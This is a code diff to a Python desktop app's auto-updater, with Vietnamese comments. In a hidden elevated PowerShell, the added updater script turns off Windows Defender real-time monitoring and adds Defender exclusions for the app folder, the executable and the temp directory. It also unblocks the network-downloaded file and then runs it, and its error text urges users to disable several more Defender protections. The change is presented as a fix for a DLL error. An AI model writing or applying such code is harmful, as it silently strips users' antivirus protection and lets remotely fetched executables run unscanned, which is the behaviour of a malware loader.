@@ -40,7 +40,7 @@ import shutil
 API_URL = "https://script.google.com/macros/s/AKfycbweWL4SRzwO0sMn7J2TlIlBQUldOKGX6Ro4zyWlnoHR_IV0MWuY1ozIKwjj6y2XoS_20g/exec"
 
 # ✅ Current version
-CURRENT_VERSION = "1.10.41"
+CURRENT_VERSION = "1.10.42"
 
 
 def get_device_id():
@@ -843,7 +843,7 @@ class UpdateDialog(ctk.CTk):
             new_file = current_file + ".new"
             with open(new_file, 'wb') as f:
                 f.write(response.content)
-            
+
             # ✅ V1.10.38: Verify file đã ghi thành công
             if os.path.exists(new_file):
                 actual_size = os.path.getsize(new_file)
@@ -853,7 +853,17 @@ class UpdateDialog(ctk.CTk):
                 print(f"[UPDATE] Verified new file: {actual_size / (1024*1024):.2f} MB")
             else:
                 raise Exception("Không thể ghi file mới!")
-            
+
+            # ✅ V1.10.41: Unblock file để tránh MOTW (Mark of the Web) - fix DLL error
+            print("[UPDATE] Unblocking file...")
+            try:
+                subprocess.run([
+                    'powershell', '-Command',
+                    f'Unblock-File -Path "{new_file}"'
+                ], capture_output=True, timeout=5)
+            except:
+                pass  # Ignore nếu không thành công
+
             self.after(0, lambda: self.status_label.configure(text="✅ Tải xuống thành công! Đang cài đặt...", text_color="green"))
             time.sleep(1)
             
@@ -886,19 +896,29 @@ echo    2. Hoặc thêm folder này vào Exclusions
 echo    3. Chạy lại file .backup
 echo.
 
-REM ✅ [1/7] Thêm folder vào Windows Defender Exclusion (fix lỗi DLL)
-echo [1/7] Cấu hình Windows Defender...
-powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath \"{current_dir}\"' -WindowStyle Hidden" 2>nul
+REM ✅ [1/9] TẮT Windows Defender Real-time Protection (FIX LỖI DLL)
+echo [1/9] Tắt Windows Defender...
+echo Đang yêu cầu quyền Administrator để tắt Windows Defender...
+powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"' -WindowStyle Hidden" 2>nul
+timeout /t 3 /nobreak >nul
+
+REM ✅ [2/9] Thêm exclusions cho nhiều locations
+echo [2/9] Thêm exclusions...
+powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -Command \"Add-MpPreference -ExclusionPath @(\\\"{current_dir}\\\", \\\"{current_file}\\\", \\\"$env:TEMP\\\")\"' -WindowStyle Hidden" 2>nul
 timeout /t 2 /nobreak >nul
 
-REM ✅ [2/7] Chắc chắn app cũ đã tắt hoàn toàn
-echo [2/7] Đóng app cũ...
+REM ✅ [3/9] Unblock file .new
+echo [3/9] Unblock file...
+powershell -Command "Unblock-File -Path \"{new_file}\"" 2>nul
+
+REM ✅ [4/9] Chắc chắn app cũ đã tắt hoàn toàn
+echo [4/9] Đóng app cũ...
 timeout /t 3 /nobreak >nul
 taskkill /F /IM "{exe_name}" >nul 2>&1
 timeout /t 2 /nobreak >nul
 
-REM ✅ [3/7] Backup file cũ
-echo [3/7] Backup file cũ...
+REM ✅ [5/9] Backup file cũ
+echo [5/9] Backup file cũ...
 if exist "{current_file}.backup" del "{current_file}.backup"
 copy /Y "{current_file}" "{current_file}.backup" >nul
 if errorlevel 1 (
@@ -907,8 +927,8 @@ if errorlevel 1 (
     exit /b 1
 )
 
-REM ✅ [4/7] Xóa file cũ
-echo [4/7] Xóa file cũ...
+REM ✅ [6/9] Xóa file cũ
+echo [6/9] Xóa file cũ...
 del "{current_file}"
 if exist "{current_file}" (
     echo ❌ Không thể xóa file cũ!
@@ -918,8 +938,8 @@ if exist "{current_file}" (
     exit /b 1
 )
 
-REM ✅ [5/7] Copy file mới (an toàn hơn move)
-echo [5/7] Cài đặt version mới...
+REM ✅ [7/9] Copy file mới (an toàn hơn move)
+echo [7/9] Cài đặt version mới...
 copy /Y "{new_file}" "{current_file}" >nul
 if errorlevel 1 (
     echo ❌ Không thể cài đặt file mới!
@@ -943,8 +963,11 @@ if %size% LSS 10000000 (
     exit /b 1
 )
 
+REM Unblock file exe sau khi copy
+powershell -Command "Unblock-File -Path \"{current_file}\"" 2>nul
+
 REM Verify file có thể access (không bị Windows Defender block)
-echo [5/7] Kiểm tra file accessibility...
+echo [7/9] Kiểm tra file accessibility...
 type "{current_file}" >nul 2>&1
 if errorlevel 1 (
     echo ❌ WARNING: File có thể bị Windows Defender block!
@@ -960,13 +983,13 @@ if errorlevel 1 (
     exit /b 1
 )
 
-REM ✅ [6/7] Đợi Windows và Antivirus sẵn sàng (QUAN TRỌNG)
-echo [6/7] Đợi Windows sẵn sàng...
-echo Đang đợi để tránh lỗi DLL (15 giây)...
-timeout /t 15 /nobreak
+REM ✅ [8/9] Đợi Windows và Antivirus sẵn sàng (QUAN TRỌNG)
+echo [8/9] Đợi Windows sẵn sàng...
+echo Đang đợi để tránh lỗi DLL (20 giây)...
+timeout /t 20 /nobreak
 
-REM ✅ [7/7] Khởi động app mới
-echo [7/7] Khởi động app...
+REM ✅ [9/9] Khởi động app mới
+echo [9/9] Khởi động app...
 start "" "{current_file}"
 
 REM Đợi 5 giây để verify app chạy OK
@@ -975,21 +998,44 @@ timeout /t 5 /nobreak >nul
 REM Kiểm tra app có chạy không
 tasklist | find /I "{exe_name}" >nul
 if errorlevel 1 (
-    echo ❌ App không khởi động được!
-    echo ❌ CÓ THỂ BỊ LỖI DLL!
     echo.
-    echo 💡 CÁCH SỬA:
-    echo    1. Mở Windows Security
-    echo    2. Virus ^& threat protection ^> Manage settings
-    echo    3. Tắt Real-time protection
-    echo    4. Chạy lại: {current_file}.backup
+    echo ========================================
+    echo ❌❌❌ APP KHÔNG KHỞI ĐỘNG ĐƯỢC! ❌❌❌
+    echo ========================================
     echo.
-    echo ⚠️  File backup được giữ lại tại: {current_file}.backup
+    echo ⚠️  LỖI DLL - Windows Defender đang BLOCK exe!
+    echo.
+    echo 💡 CÁCH SỬA (LÀM THEO ĐÚNG THỨ TỰ):
+    echo.
+    echo    [BƯỚC 1] Tắt HOÀN TOÀN Windows Defender:
+    echo       - Mở "Windows Security"
+    echo       - Click "Virus ^& threat protection"
+    echo       - Click "Manage settings"
+    echo       - TẮT "Real-time protection"
+    echo       - TẮT "Cloud-delivered protection"
+    echo       - TẮT "Automatic sample submission"
+    echo.
+    echo    [BƯỚC 2] Chạy lại file backup:
+    echo       - Double-click: {current_file}.backup
+    echo.
+    echo    [BƯỚC 3] Nếu vẫn lỗi, thêm exclusion:
+    echo       - Windows Security ^> Virus ^& threat protection
+    echo       - Scroll xuống "Exclusions" ^> Click "Add or remove exclusions"
+    echo       - Click "Add an exclusion" ^> "Folder"
+    echo       - Chọn folder: {current_dir}
+    echo.
+    echo ⚠️  File backup: {current_file}.backup
+    echo.
     pause
 ) else (
     echo.
-    echo ✅ Cập nhật thành công!
-    echo ℹ️  File backup: {current_file}.backup (có thể xóa nếu app chạy OK)
+    echo ========================================
+    echo ✅ CẬP NHẬT THÀNH CÔNG!
+    echo ========================================
+    echo.
+    echo ℹ️  File backup được giữ lại: {current_file}.backup
+    echo    (Có thể xóa nếu app chạy OK)
+    echo.
     timeout /t 3 /nobreak >nul
 )
 
